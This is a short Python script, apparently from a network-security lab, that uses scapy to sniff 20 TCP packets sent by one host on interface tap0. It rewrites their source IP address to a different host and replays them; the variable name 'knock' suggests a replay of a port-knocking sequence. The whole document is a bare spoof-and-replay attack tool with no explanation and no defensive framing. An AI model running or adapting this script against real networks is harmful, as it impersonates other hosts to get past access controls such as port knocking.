#!/usr/bin/env python
from scapy.all import sniff, Ether, IP, TCP, RandIP, RandMAC, sendp

# create a pcap from traffic to the target
#pcap = sniff(iface="tap0",filter='dst host 10.5.0.6')
pcap = sniff(iface='tap0', filter = 'tcp and src 10.5.0.4',count=20)

for knock in pcap:
   knock[IP].src = "10.5.0.35"
   sendp(knock, iface='tap0')

#a = sniff(iface='tap0', filter = 'tcp and src 10.5.0.4', prn = lambda x: x.summary())
#for p in a:
      # do something to the packets...
   #sendp(p, iface='tap0')

